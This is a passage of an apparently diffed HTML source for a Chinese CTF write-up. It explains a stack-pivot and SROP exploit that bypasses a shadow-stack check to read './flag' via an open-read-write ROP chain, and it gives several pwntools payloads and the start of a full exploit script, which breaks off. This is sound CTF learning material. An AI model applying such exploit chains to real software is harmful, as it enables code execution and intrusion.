+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150324/2025/11/6cd912b9197628ee3ef43214567e300d.png"
+                     
+                ></p>
 <p>后续的栈风水为什么这样，画个图来表示吧，执行完read之后</p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150326/2025/11/090b91bc83ed351cab1d545308400efb.png"><br>(图中有误,应该是rbp+0x100,RBP+0xf0-0x60)</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload3 = flat(<br>    <span class="hljs-string">b&#x27;I love you I feel lonely&#x27;</span>*<span class="hljs-number">4</span>,<br>    RBP,<br>    RET,<br>    RBP+<span class="hljs-number">0xf0</span>,<br>    read<br>)<br></code></pre></td></tr></table></figure>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150326/2025/11/090b91bc83ed351cab1d545308400efb.png"
+                     
+                ><br>(图中有误,应该是rbp+0x100,RBP+0xf0-0x60)</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload3 = flat(<br>    <span class="hljs-string">b&#x27;I love you I feel lonely&#x27;</span>*<span class="hljs-number">4</span>,<br>    RBP,<br>    RET,<br>    RBP+<span class="hljs-number">0xf0</span>,<br>    read<br>)<br></code></pre></td></tr></table></figure></div>
 
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150328/2025/11/dc394f4e3ab6d67a575b7995d8fe3599.png"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150328/2025/11/dc394f4e3ab6d67a575b7995d8fe3599.png"
+                     
+                ></p>
 <p>这段栈风水，准备读入srop的参数，但是有检测，所以我们先读一段正常的修改read的返回地址，栈返回来绕过<code>shadow</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">payload4 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">8</span>,<br>    p64(<span class="hljs-number">0</span>),RBP+<span class="hljs-number">0x30</span>,<br>    RBP+<span class="hljs-number">0x65</span>,<span class="hljs-number">0x6edca</span>,<br>    <span class="hljs-number">0x200</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,RBP+<span class="hljs-number">0x40</span>,<br>    read_addr2,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0x33</span>,RBP+<span class="hljs-number">0x150</span>+<span class="hljs-number">1</span>,<br>    read_addr,RBP+<span class="hljs-number">0x20</span>,<br>    leave_ret<br>)<br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">payload4 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">8</span>,<br>    p64(<span class="hljs-number">0</span>),RBP+<span class="hljs-number">0x30</span>,<br>    RBP+<span class="hljs-number">0x65</span>,<span class="hljs-number">0x6edca</span>,<br>    <span class="hljs-number">0x200</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,RBP+<span class="hljs-number">0x40</span>,<br>    read_addr2,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0x33</span>,RBP+<span class="hljs-number">0x150</span>+<span class="hljs-number">1</span>,<br>    read_addr,RBP+<span class="hljs-number">0x20</span>,<br>    leave_ret<br>)<br></code></pre></td></tr></table></figure></div>
 
-<p>这里0x60读入的数据是srop参数，0x60后面的数据可以rop,修改read的返回地址为<code>leave_ret</code>到去执行<code>read</code>,这样可以绕过检测<br><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150330/2025/11/e270bf8f49c2e5aab6e424ed65cdb4f9.png"></p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150331/2025/11/1db74ccaaaf00e2bc2c44c9508e582c2.png"></p>
+<p>这里0x60读入的数据是srop参数，0x60后面的数据可以rop,修改read的返回地址为<code>leave_ret</code>到去执行<code>read</code>,这样可以绕过检测<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150330/2025/11/e270bf8f49c2e5aab6e424ed65cdb4f9.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150331/2025/11/1db74ccaaaf00e2bc2c44c9508e582c2.png"
+                     
+                ></p>
 <p>这里读入参数从第二行开始是从rdi开始对应<code>signal frame</code>中得rdi至err，其中<br><code>uc_flags</code>字段需要设置为0<br><code>cs/gs/fs</code>字段一般设置为0x33<br><code>&amp;fpstate</code>字段需要设置为0。或者一个可读地址</p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150334/2025/11/c3e383ed0a9ae2b7db4e483d858735c0.png"><br>(借用hueimie师傅的图)</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload5 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">7</span>,<br>    pop_rbp_ret<br>)<br></code></pre></td></tr></table></figure>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150334/2025/11/c3e383ed0a9ae2b7db4e483d858735c0.png"
+                     
+                ><br>(借用hueimie师傅的图)</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload5 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">7</span>,<br>    pop_rbp_ret<br>)<br></code></pre></td></tr></table></figure></div>
 
-<p>读入15字节，在没有<code>gadgets</code>可以依靠这个来控制rax寄存器，用于后面栈迁移到<code>syscall</code>处系统调用<code>sigreturn</code>，执行<code>pop_rbp_ret</code>可以用于抬栈，执行<code>leave_ret</code><br><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150336/2025/11/ced44b9cd3bff66f6d916a51c3315ccc.png"></p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150338/2025/11/8092cd4c46051e5ba272ee3db05c79a2.png"></p>
+<p>读入15字节，在没有<code>gadgets</code>可以依靠这个来控制rax寄存器，用于后面栈迁移到<code>syscall</code>处系统调用<code>sigreturn</code>，执行<code>pop_rbp_ret</code>可以用于抬栈，执行<code>leave_ret</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150336/2025/11/ced44b9cd3bff66f6d916a51c3315ccc.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150338/2025/11/8092cd4c46051e5ba272ee3db05c79a2.png"
+                     
+                ></p>
 <p>leave_ret指向完毕后会执行<code>rt_sigreturn</code></p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150340/2025/11/7a742b3a1dff6b3cfcb8de0fcb260fb2.png"><br>这次<code>srop</code>没有进行相关的系统调用，更多的是设置好参数为了系统调用做准备。<br><code>rip = read_addr2</code>这里执行完后会直接<code>call read</code>,执行read(0,RBP+0x30,0x200)<br><code>rbp = RBP + 0x65</code><br><code>rsp = RBP + 0x40</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">payload6 = flat(<br>    leave_ret,add_rbp_3d_ebx,<br>    pop_rbp_ret,RBP+<span class="hljs-number">0xa8</span>+<span class="hljs-number">1</span>,<br>    read_addr,RBP+<span class="hljs-number">0x20</span>,<br>    leave_ret,RBP+<span class="hljs-number">0xd0</span>,<br>    read_addr,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>,<br>    <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<br>    RBP+<span class="hljs-number">0x68</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">33</span>,<br>    <span class="hljs-number">0</span>,RBP+<span class="hljs-number">0x28</span>,<br>    ret,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0x33</span><br>)<br></code></pre></td></tr></table></figure>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150340/2025/11/7a742b3a1dff6b3cfcb8de0fcb260fb2.png"
+                     
+                ><br>这次<code>srop</code>没有进行相关的系统调用，更多的是设置好参数为了系统调用做准备。<br><code>rip = read_addr2</code>这里执行完后会直接<code>call read</code>,执行read(0,RBP+0x30,0x200)<br><code>rbp = RBP + 0x65</code><br><code>rsp = RBP + 0x40</code></p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">payload6 = flat(<br>    leave_ret,add_rbp_3d_ebx,<br>    pop_rbp_ret,RBP+<span class="hljs-number">0xa8</span>+<span class="hljs-number">1</span>,<br>    read_addr,RBP+<span class="hljs-number">0x20</span>,<br>    leave_ret,RBP+<span class="hljs-number">0xd0</span>,<br>    read_addr,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>,<br>    <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<br>    RBP+<span class="hljs-number">0x68</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">33</span>,<br>    <span class="hljs-number">0</span>,RBP+<span class="hljs-number">0x28</span>,<br>    ret,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0x33</span><br>)<br></code></pre></td></tr></table></figure></div>
 
 <p>接下来重新读入<code>srop</code>参数<br>由于我们将rsp设置为<code>RBP+0x40</code>，<code>call read</code>会将read的返回地址压栈，保存在<code>RBP+0x38</code></p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150341/2025/11/0217854d42f1fa3768e25556902267ea.png"></p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150343/2025/11/95474cc3acb18e0f0d120072065875e6.png"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150341/2025/11/0217854d42f1fa3768e25556902267ea.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150343/2025/11/95474cc3acb18e0f0d120072065875e6.png"
+                     
+                ></p>
 <p>因此我们读入的<code>add_rbp_3d_ebx</code>就是返回地址，直接开始rop<br>因为刚刚<code>srop</code>，<code>rbp = RBP + 0x65</code>,<code>rbx = 0x6edca</code>这个偏移<br>执行完<code>add_rbp_3d_ebx</code>后就变成新的syscall_ret了</p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150345/2025/11/9cffa59ca8ec236638d1cd04099fe0ad.png"></p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150347/2025/11/863725211bee10f582cb8b339045e81e.png"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150345/2025/11/9cffa59ca8ec236638d1cd04099fe0ad.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150347/2025/11/863725211bee10f582cb8b339045e81e.png"
+                     
+                ></p>
 <p>之后就是执行read,读入的地方在<code>RBP+0x49</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload7 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">7</span>,<br>    pop_rbp_ret<br>)<br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload7 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">7</span>,<br>    pop_rbp_ret<br>)<br></code></pre></td></tr></table></figure></div>
 
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150348/2025/11/d5c90d2d9b7457c70199001f0d4e15e9.png"></p>
-<p>再次栈迁移调用执行<code>rt_sigreturn</code>，设置好寄存器<br><code>rbp = RBP+0x68</code><br><code>rsp = RBP+0x28</code><br><code>rip = ret</code><br><code>syscall</code>后<code>ret</code>，<code>pop_rip</code>会再次调用<code>syscall_ret</code>，从而完成<code>dup(1,2)</code>的系统调用，ret到<code>leave</code>，迁移到下面的read再次读入<br><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150350/2025/11/3a2c96233f1c9a6b4cece00a17689f9c.png"><br>执行的read(0,0xd0-0x60,0x88)<br>执行完read时，会将返回地址压栈压到<code>RBP+0x70</code><br><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150352/2025/11/cc98fde73644f353af00ade35790afaf.png"><br>所以read完之后直接执行<code>rop</code><br><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150353/2025/11/4cbcf31305f4390ecfa522b251429f03.png"><br>随后也是读入15字节，来执行syscall</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload9 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">7</span>,<br>    pop_rbp_ret<br>)<br></code></pre></td></tr></table></figure>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150348/2025/11/d5c90d2d9b7457c70199001f0d4e15e9.png"
+                     
+                ></p>
+<p>再次栈迁移调用执行<code>rt_sigreturn</code>，设置好寄存器<br><code>rbp = RBP+0x68</code><br><code>rsp = RBP+0x28</code><br><code>rip = ret</code><br><code>syscall</code>后<code>ret</code>，<code>pop_rip</code>会再次调用<code>syscall_ret</code>，从而完成<code>dup(1,2)</code>的系统调用，ret到<code>leave</code>，迁移到下面的read再次读入<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150350/2025/11/3a2c96233f1c9a6b4cece00a17689f9c.png"
+                     
+                ><br>执行的read(0,0xd0-0x60,0x88)<br>执行完read时，会将返回地址压栈压到<code>RBP+0x70</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150352/2025/11/cc98fde73644f353af00ade35790afaf.png"
+                     
+                ><br>所以read完之后直接执行<code>rop</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150353/2025/11/4cbcf31305f4390ecfa522b251429f03.png"
+                     
+                ><br>随后也是读入15字节，来执行syscall</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload9 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">7</span>,<br>    pop_rbp_ret<br>)<br></code></pre></td></tr></table></figure></div>
 
-<p>和上次调用dup(1.2)原理一致<br><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150354/2025/11/e1dd8d58d508c7054e1eadff9545e43a.png"><br>这里调用write(2,RBP+0x28,0x200)<br>设置<br><code>rip = ret</code><br><code>rsp = RBP+0x28</code><br><code>rbp = RBP + 0xe8</code><br>因为<code>rbp = RBP + 0xe8</code>,执行完syscall后将会<code>leave_ret</code>迁移到<code>read_addr3</code><br>执行read(0,RBP+0x28,0x200)<br>这也是为什么要设置0x200的原因，为了这里方便转read</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = flat(<br>    <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc0</span>,<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>,<br>    pop_rax_ret,<span class="hljs-number">3</span>,<br>    pop_rdi_ret,<span class="hljs-number">0</span>,syscall,<br>    pop_rax_ret,<span class="hljs-number">2</span>,<br>    pop_rdi_ret,RBP+<span class="hljs-number">0xe8</span>,<br>    pop_rsi_ret,<span class="hljs-number">0</span>,syscall,<br>    pop_rax_ret,<span class="hljs-number">0</span>,<br>    pop_rdi_ret,<span class="hljs-number">0</span>,<br>    pop_rsi_ret,RBP,syscall,<br>    pop_rax_ret,<span class="hljs-number">1</span>,<br>    pop_rdi_ret,<span class="hljs-number">2</span>,syscall<br>)<br></code></pre></td></tr></table></figure>
+<p>和上次调用dup(1.2)原理一致<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150354/2025/11/e1dd8d58d508c7054e1eadff9545e43a.png"
+                     
+                ><br>这里调用write(2,RBP+0x28,0x200)<br>设置<br><code>rip = ret</code><br><code>rsp = RBP+0x28</code><br><code>rbp = RBP + 0xe8</code><br>因为<code>rbp = RBP + 0xe8</code>,执行完syscall后将会<code>leave_ret</code>迁移到<code>read_addr3</code><br>执行read(0,RBP+0x28,0x200)<br>这也是为什么要设置0x200的原因，为了这里方便转read</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = flat(<br>    <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc0</span>,<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>,<br>    pop_rax_ret,<span class="hljs-number">3</span>,<br>    pop_rdi_ret,<span class="hljs-number">0</span>,syscall,<br>    pop_rax_ret,<span class="hljs-number">2</span>,<br>    pop_rdi_ret,RBP+<span class="hljs-number">0xe8</span>,<br>    pop_rsi_ret,<span class="hljs-number">0</span>,syscall,<br>    pop_rax_ret,<span class="hljs-number">0</span>,<br>    pop_rdi_ret,<span class="hljs-number">0</span>,<br>    pop_rsi_ret,RBP,syscall,<br>    pop_rax_ret,<span class="hljs-number">1</span>,<br>    pop_rdi_ret,<span class="hljs-number">2</span>,syscall<br>)<br></code></pre></td></tr></table></figure></div>
 
 <p>这里read的返回地址为RBP+0xf0,后面在跟上orw的rop</p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150356/2025/11/a9707fbe7241562f1d6079d94a02f640.png"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150356/2025/11/a9707fbe7241562f1d6079d94a02f640.png"
+                     
+                ></p>
 <p>exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#cli_script() </span><br><br>io = process(<span class="hljs-string">&#x27;./pwn_patched&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn_patched&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p =remote(&#x27;node4.anna.nssctf.cn&#x27;,28537)</span><br><span class="hljs-comment">#context.terminal = [&#x27;wt.exe&#x27;, &#x27;wsl&#x27;, &#x27;bash&#x27;, &#x27;-c&#x27;]</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = elf.arch,os = elf.os)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">i</span>):<br>    gdb.attach(i)<br>    pause()<br><br><span class="hljs-comment"># dbg(io)</span><br>io.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>RBP = <span class="hljs-built_in">int</span>(io.recvline(),<span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&quot;RBP:&quot;</span>+<span class="hljs-built_in">hex</span>(RBP))<br><br>io.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>RET = <span class="hljs-built_in">int</span>(io.recvline(),<span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&quot;RET:&quot;</span>+<span class="hljs-built_in">hex</span>(RET))   <br><br>elf_base = RET - <span class="hljs-number">0x1871</span><br>success(<span class="hljs-string">&quot;elf_base:&quot;</span>+<span class="hljs-built_in">hex</span>(elf_base))<br><br>read_addr = elf_base + <span class="hljs-number">0x182F</span><br>read_addr2 = elf_base + <span class="hljs-number">0x1840</span><br>read_addr3 = elf_base + <span class="hljs-number">0x183B</span><br>add_rbp_3d_ebx = elf_base + <span class="hljs-number">0x1252</span><br>pop_rbp_ret = add_rbp_3d_ebx +<span class="hljs-number">1</span><br>ret = pop_rbp_ret + <span class="hljs-number">1</span><br>leave_ret = elf_base + <span class="hljs-number">0x1852</span><br><br>payload1 = flat(<br>    <span class="hljs-string">b&#x27;I love you I feel lonely&#x27;</span>*<span class="hljs-number">4</span>,<br>    RBP,<br>    RET,<br>    RBP + <span class="hljs-number">0x10</span>,<br>    read_addr,<br>    RBP - <span class="hljs-number">0x10</span><br>)<br><br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload1)<br><br>payload2 = flat(<br>    p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>,<br>    RBP+<span class="hljs-number">0xf0</span>,<br>    read_addr,<br>    leave_ret,<br>    RBP+<span class="hljs-number">0x100</span>,<br>    leave_ret,<br>    RBP-<span class="hljs-number">0x18</span>,<br>    leave_ret,<br>    <span class="hljs-number">0</span>,<br>    p8(<span class="hljs-number">0xec</span>)<br>)<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload2)<br>payload3 = flat(<br>    <span class="hljs-string">b&#x27;I love you I feel lonely&#x27;</span>*<span class="hljs-number">4</span>,<br>    RBP,<br>    RET,<br>    RBP+<span class="hljs-number">0xf0</span>,<br>    read_addr<br>)<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload3)<br><br>payload4 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">8</span>,<br>    p64(<span class="hljs-number">0</span>),RBP+<span class="hljs-number">0x30</span>,<br>    RBP+<span class="hljs-number">0x65</span>,<span class="hljs-number">0x6edca</span>,<br>    <span class="hljs-number">0x200</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,RBP+<span class="hljs-number">0x40</span>,<br>    read_addr2,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0x33</span>,RBP+<span class="hljs-number">0x150</span>+<span class="hljs-number">1</span>,<br>    read_addr,RBP+<span class="hljs-number">0x20</span>,<br>    leave_ret<br>)<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload4)<br><br>payload5 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">7</span>,<br>    pop_rbp_ret<br>)<br><br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload5)<br><br>payload6 = flat(<br>    leave_ret,add_rbp_3d_ebx,<br>    pop_rbp_ret,RBP+<span class="hljs-number">0xa8</span>+<span 